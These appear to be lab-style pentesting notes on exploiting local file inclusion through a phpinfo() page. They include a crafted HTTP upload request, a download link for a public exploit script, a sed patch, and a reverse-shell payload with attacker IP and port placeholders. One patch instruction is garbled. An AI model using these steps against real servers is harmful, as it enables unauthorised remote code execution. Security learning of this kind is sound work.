https://www.youtube.com/watch?v=rs4zEwONzzk&t=600s

> To exploit this vulnerability you need: **A LFI vulnerability, a page where phpinfo() is displayed, "file_uploads = on" and the server has to be able to write in the "/tmp" directory.**

![[file_uploads.png]]

### Steps:
- Intercept the page with Burp Proxy.
- Send it to Repeater.
- Change the page request to  POST.
- Modify the rest of the page as follow:
```
POST /info.php HTTP/1.1
Host: 10.10.183.153
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=--PleaseSubscribe
Content-Length: 166

----PleaseSubscribe
Content-Disposition: form-data; name="anything"; filename="LeaveAComment"
Content-Type: text/

Please share my videos
----PleaseSubscribe
```
- Send the page and you'll see the following:
	![[php_variables.png]]
-  Download the exploit file from https://www.insomniasec.com/downloads/publications/phpinfolfi.py.
- You need to fix the exploit (change **=>** for **=>**). To do so you can do:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
- Change the **payload** at the beginning of the exploit (for a php-rev-shell for example).
	$ip = '127.0.0.1';  // CHANGE THIS TO YOUR ATTACKER IP
	$port = 1234;       // CHANGE THIS
- Change the **REQ1** variable (this should point to the phpinfo page and should have the padding included.
```
	REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
```
